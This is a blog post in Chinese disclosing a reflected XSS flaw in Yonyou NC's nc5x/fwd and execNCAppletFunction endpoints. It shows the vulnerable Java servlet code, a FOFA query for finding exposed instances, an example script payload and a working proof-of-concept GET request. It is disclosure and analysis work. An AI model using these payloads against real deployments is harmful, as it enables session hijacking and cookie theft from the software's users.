---
title: "用友NC nc5x/fwd、execNCAppletFunction 跨站脚本（XSS）漏洞"
source: https://mrxn.net/jswz/yonyou-nc5x-xss.html
asset_dir: assets/用友nc-nc5xfwd、execncappletfunction-跨站脚本（xss）漏洞
---

# 用友NC nc5x/fwd、execNCAppletFunction 跨站脚本（XSS）漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/10/5 10:26
* 651浏览
* [0评论](#comment)
* 30分钟阅读

深入探索

浏览器

客户关系管理

script


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)NC是用友公司推出的一款企业管理软件，涵盖财务、供应链、生产制造等多个业务领域，旨在帮助企业实现信息化管理。用友NC nc5x/fwd 接口存在跨站[脚本](#)（[XSS](https://mrxn.net/tag/xss)）漏洞。该漏洞源于`fwd`方法直接将`funcode`和`systemcode`参数的值拼接到HTML代码中，并作为`openNCNode`函数的参数，而没有进行充分的输入验证和过滤。攻击者可以通过构造包含恶意JavaScript代码的`funcode`或`systemcode`参数，例如`"><script>alert('XSS')</script>`，当用户访问包含恶意参数的URL时，恶意脚本会在用户的浏览器中执行。该漏洞可能导致攻击者劫持用户的会话、窃取用户的敏感信息（如Cookie），或者在用户的浏览器中执行任意JavaScript代码，从而进行恶意操作，例如篡改页面内容、重定向用户到恶意网站等。

脚本语言

# 影响版本

# fofa语法

> app="用友-UFIDA-NC"

# 漏洞分析

深入探索

安全运维咨询

安全工具开发

安全认证考试

## fwd

直接看代码

```
@Servlet(
    path = "/nc5x"
)
public class NC5xNodeIntAction extends BaseAction {
    @Action
    public void fwd(@Param(name = "funcode") String funcode, @Param(name = "systemcode") String systemcode) {
        String globalPath = LfwRuntimeEnvironment.getRootPath();
        String openNodeScriptUrl = globalPath + "/html/frame/nc5xNode.js";
        this.print("<html><head>");
        this.print("<script src='" + openNodeScriptUrl + "'></script>");
        this.print("<script src='/lfw/frame/script/basic/BrowserSniffer.js'></script>");
        this.print("<script>");
        this.print("if(IS_IE && !IS_IE9){window.$ = document.getElementById;}else{function $(id) {\treturn document.getElementById(id);\t}}");
        this.print("window.globalPath = '" + globalPath + "';");
        this.print("</script>");
        this.print("</head>");
        this.print("<body onload=\"openNCNode('" + funcode + "','" + systemcode + "');\"></body>");
        this.print("<html>");
    }
```

`this.print("<body onload=\"openNCNode('" + funcode + "','" + systemcode + "');\"></body>");` 这一行，从外部请求中获取的 `funcode` 和 `systemcode` 变量被直接使用 `+` 进行字符串拼接，嵌入到 `onload` 事件处理器的 JavaScript 代码中。`onload` 中的内容 `openNCNode('...', '...')` 是一个 JavaScript 函数调用，其参数由单引号包裹。攻击者可以通过精心构造的输入，闭合前面的单引号和函数调用，然后注入恶意的 JavaScript [脚本](#)。

漏洞预警服务

## execNCAppletFunction

```
@Action
public void execNCAppletFunction() {
    String param = this.request.getParameter("param");
    String globalPath = LfwRuntimeEnvironment.getRootPath();
    String openNodeScriptUrl = globalPath + "/html/frame/nc5xNode.js";
    this.print("<html><head>");
    this.print("<script src='" + openNodeScriptUrl + "'></script>");
    this.print("<script src='/lfw/frame/script/basic/BrowserSniffer.js'></script>");
    this.print("<script>");
    this.print("if(IS_IE && !IS_IE9){window.$ = document.getElementById;}else{function $(id) {\treturn document.getElementById(id);\t}}");
    this.print("window.globalPath = '" + globalPath + "';");
    this.print("</script>");
    this.print("</head>");
    this.print("<body onload=\"execNCAppletFunction('nc.client.portal.PortalInNCClient', 'openMsgPanel', 'notice;" + param + "', 'nc57');\"></body>");
    this.print("<html>");
}
```

# 漏洞复现

```
GET /portal/pt/nc5x/fwd?pageId=login&funcode=1%27);%22%20onmouseover=%22alert(`xss`)%22%20x=%22&systemcode=1111 HTTP/1.1
Host: nc.mrxn.net
```

[![用友NC nc5x/fwd、execNCAppletFunction 跨站脚本（XSS）漏洞](images/img-001-e0aff4e8e10d.webp)](https://image.mrxn.net/60874e8baff84a8084653d415d2d14ce.webp)

两个参数一样的问题

物流软件安全

* 标签：
* [#XSS](https://mrxn.net/tag/XSS)
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.fwd](#toc-4-1-)
* [4.2.execNCAppletFunction](#toc-4-2-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友NC nc5x/fwd、execNCAppletFunction 跨站脚本（XSS）漏洞](https://mrxn.net/jswz/yonyou-nc5x-xss.html)  
文章链接：<https://mrxn.net/jswz/yonyou-nc5x-xss.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc5x-xss.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

网络浏览器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKbUlEQVR4Aeyd7Zobtw6D/eb+77knMAuRI2nk2Y3X9mmUJywoAKRmxdF+5Ud/3W63f/40/ln8mfWe2Ve+q9qsb8+tesk7081JPwt7/hQ1kN899t9POYE2kN+Tv30lZh8AcINjuGf1w9EDVPk0dy8hcN9LuQOCg0Q3g+C8rgihAe0Mqn6l/8zvukdYa9tAKrnz953AMBDItwXGfPWofhOqB6JH5WY+69aEPef1GapGUXU47i/dYZ/XwhVn7SpC7A1znPUZBjIzbe51J7AH8rqzvrTTjwxEV9/hp/BaOOPEK6wJ4XjVxT0ztJ+i9oTjnpDr6lOdonLPyH9kIM94sL+1x48MBOZvVX/IkD6IvHr0BirMQXgAUwcEhm+FbVAfhdcVIepg/m2vvap3mHs2/shAbs9+yr+o3x7Ihw17GIiv5Bmunh/i6s88EBokVp/3g1G3NsNHPVwD2Rcid609QghNeR8QGuDSJfb1/XpWPAxkZtrc606gDQS4f0GEa7h6xPom2PeIg9i3+iA494BYA6YOz9zIRbLqf1YG3Pe5Wgvhh2tY920DqeTO33cCeyDvO/vpzr/qNfxu3neGvKrWIDnvA8nZt0LXCSFqV35pED7VKMT1AeGB/DkEkuv9WquXQrlC+TNi3xCd5gfFpYFAvi1wnq/ekPoxQ/SY+SE0GN/W2mNWW3Xn9nkNY397hPZVFK+oHEQfcxBrSLR2hhDeql8aSC14Y/5XbD0MBGJqkKi340pA1sAxn50mHD3AwQYcvt08iP8uIDzAv8yt/TOsntkkcOg10yA8gMtOUfUK4N53ZoTQILH6VK+o3DCQKu789SewB/L6M1/u+AvyOkF+IdVVcsDRA/P1cqciuu8Mi21IYdy39nABpM+cfTBq9lS0XwhRU3UITvpXovaY5fuGzE7ljVz7wdDPADF5SKxvgH0zztojhOg989W+zmc+cxC9AFNTBO5ffN1TaKPyPiD8gG33euCOJuG4Ni+E0CBRvAOC91q4b4hO4YNiD+SDhqFHGQbSX12tZewD4rrB+I1A7+3X6qmA7AGR9966Vk0fVYfHPSA8MMfaz3m/Z13bA2O/6nNuf0XI2mEg1fhX5B/2QS4HAjG52TN74sJeF+fotbq2R2geYk9ItFYRQleto+rOIXxe23uGcPSrDoKDEWd9VKOA9GutgORcK96xHIhNG193AnsgrzvrSzu1n9TthvWV8jWD9PW1XgvtV34l7Bf2fsg9pSuqR+s+rJuH7AGR23OGrq1oL0QPSLTPnorWhJV3vm+IT+JDcBiIJueAmHp9VgjOHmHV+xyu+dVHAeGH/HYagpPugOBgxP4ZztbuVfUZV3Xn9s0Q4pmq5rqKMPqGgdSCnb/+BPZAXn/myx3bQHy9IK4RsCwE7r9kg0QXwMhZE0Loyr8bft4ZQvQHWnvg/rzVD8FBYiuYJJA+iHxim1Jw7ofQgFsbyG3/eeYJfLtXGwjElK52qm+aayrX5/YIrSl3QOxvTWjNCOGBRGtCCF65Q30UXs9QusO618IVB7EnJNoP1zj7hW0gWux4/wm0f6DSm6Coj6S1AnLSWitg5FwLqZmbIax9ELprtW8f1r6D7gWxD8xx1ds9Zh5rwpVetX1D6ml8QL4H8gFDqI8wDETXywFxhWsBBGePsOrKxTkg/JAoTx8zvz3WvD5D+yraa87rM5z5IJ8dIu99XgtnvcX3MfMNA5mZNve6E1gOpJ9oXUO8KUB7WuD+wxckWpzVPuKsu8cMYdwLkoNjXntAaDPOewur3ucw9rAHQgNMHRC4n5f2cCwHcqjei5ecwB7IS475+ibLf6CCuFKQ6Na+YsKe8/oRQvZVH8WqBtJvn2ocELrXFe2H8ED+et/aGdY+znsvrPtC6hC5e0Gsgf27rNuH/Wk/qfu5PLUzhJwmRO5aY601N8Pqg+gFiX1N9VuD0Q8jZ3/tAeGzJrSufBVwrHWd0HXKHSvOmnB/DdEpfFDsgXzQMPQo7Ys6HK+gRBg5X8GK8iog/JBon3THjOs1ecxB9oNjbo9QNQrlXwnVOFwHuc+Km2kQtdaEfX9xED5rwn1DdDIfFMNAIKYG+W0hJAdj3n88mrTDGqzrer/qIGqUn4XrhGeeM141Coh9gDPrnZfXcSfKf8xXLHJLgftP5zA/32EgrXInbzmB5be9ENOsU5/lcPTNPpJVHTArGbhZj2oC7m9f5focwgP00h+tgfveQOsDDFwTfycQev243nBDfj/J/nt6Ansgp0fzHqENxNcG4hoB7YmA4epBcrNaSB3medvgJHFfyzDvA8Hbt0L3FM58EL2kOyC4mX/GQfhdL7RPucMchB/Yv8u6fdifdkNWz+WJCiGmqdzh2n5tXmitongHRF+vhRBcrVnlqlFUD0QP8QqINSRWv3MYdUhOvRT2K+8D0g+RV8+s9tJAapOd/+wJ7IH87Pl+ufvyd1mzK+UdIK4gJFpzndAcfN8HUeteQggOEsX3oWeo0etaQ/aAyMX3seoz0yrnvO+ptTXhviE6kQ+KNhBNR1GfDeJtgUTr8vYB6YPIZ34IDRLtu4r93lq7FrIvRG6tomquhGsgesH4eyh7KkL6K9/nkL42kN70/7b+rzzvHsiHTXL5y8XVs0Jes95XPw1Yg/RbtyY0t0LIHqrpY1Vrb/VA9oPI7YNYQ6K17yBkH4h81mffkNmpvJEbBgIxPcgvXPWt8rNWDqLGWkX7KufcmhCiByTaB8HJ57BWEcIHI1bfKoeorZ7ZnjD6as1Z7l7CmWcYyMy0udedwB7I68760k7DT+q6Sg4Yr2Wvwfipre4M0cN1QggOEmuNcwhdNQrzFSE8QKPldZgE2j8hQOT2zNB1Fauv8sohegJaXgrg/kzVvG9IPY0PyNu3vZ5+faYZZ92a0ByME7f2CNWnD9dA9IVEa32N1jD6Zn5IHxxz+4UQmvI+tN9ZVK89EL0gP7NU374h9TSG/PXE8DUEcoJwLV89tt+MleeR5h4VIZ6t1sLIVV05hAfmb2jdw7nqFJC1WteAc00+CN09heL72DekP5E3r/dA3jyAfvs2EF2hr0Tf6NEa4srC/FOF6yF95oxwrsnj51fex0yD6Nd7+/Ws9swjb6+drSH2V42jDeSsaPOvPYFhIBBTgzk+4/EgevutELqv8j5g9NsDoQFucfg/7Nhn0WuhuT9B4P7DHYxY+2o/ReWcQ9YOA7Fp43tOYA/kPed+uutTB6IrqYC8ghB5fQJ5FBAa